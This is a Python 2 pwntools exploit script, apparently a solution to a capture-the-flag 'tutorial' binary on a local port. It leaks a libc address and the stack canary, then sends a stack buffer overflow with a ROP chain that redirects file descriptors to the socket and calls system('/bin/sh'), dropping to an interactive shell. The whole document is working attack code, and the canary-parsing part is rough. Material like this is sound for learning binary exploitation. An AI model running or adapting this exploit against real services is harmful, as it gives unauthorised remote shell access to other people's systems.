#Import pwntools
from pwn import *

#Designate the libc elf and the remote connection
#elf = ELF("./tutorial")
libc = ELF("./libc-2.19.so")
target = remote('127.0.0.1', 44888)

#Choose the first option
print target.recvuntil('>')
target.sendline("1")

#Grab the input and parse out the address
leak = target.recvline().strip()
leak = int(leak.replace("Reference:", ""), 16)
print "leak: " + hex(leak)

#Calculate the other addresses from the leaked address
sys_adr = leak - 0x2ad80
clo_adr = leak + 0x88af0
dup_adr = leak + 0x88b50
bsh_adr = leak + 0x11a820

#Print the calculated addresses
print "sys: " + hex(sys_adr)
print "clo: " + hex(clo_adr)
print "dup: " + hex(dup_adr)
print "bsh: " + hex(bsh_adr) 

#Select the second option and send a newline character
print target.recvuntil("Quit")
target.sendline("2")
print target.recvuntil(">")
print target.recvline()
target.sendline("")
print target.recvline()

#Store the output
can = target.recvline()

#Filter out the stack canary
can = can.replace("-Tutorial-", "")
#can = can.replace("\x00", "")
can = can[-16:]
can0 = can[:len(can)/2]
can1 = can[len(can)/2:]
can = can[-13:]
can = can[:8]

#can = "\x00" + can
print len(can0)
print len(can1)

#Convert the canary to a human readable format and print them
read_can = hex(unpack(can, 64, endian='little', sign=False))
read_can0 = hex(unpack(can0, 64, endian='little', sign=False))
read_can1 = hex(unpack(can1, 64, endian='little', sign=False))
print "The stack canary is: " + read_can
print "The first canary is: " + read_can0
print "The second canary is: " + read_can1

#Select the second option again
print target.recvuntil("Quit")
target.sendline("2")
print target.recvuntil(">")
print target.recvline()

#Construct the payload and send it
rop = "\xe3\x12\x40\x00\x00\x00\x00\x00"
socket = "\x04\x00\x00\x00\x00\x00\x00\x00"
one = "\x01\x00\x00\x00\x00\x00\x00\x00"
zero = "\x00\x00\x00\x00\x00\x00\x00\x00"

#Construct the payload and send it
payload = "0"*312 + can + "0"*8 + rop + zero + p64(clo_adr) + rop + one + p64(clo_adr) + rop + socket + p64(dup_adr) + p64(dup_adr) + rop + p64(bsh_adr) + p64(sys_adr) #+ "\x00"
target.sendline(payload)

#Drop to an interactive console
target.interactive()
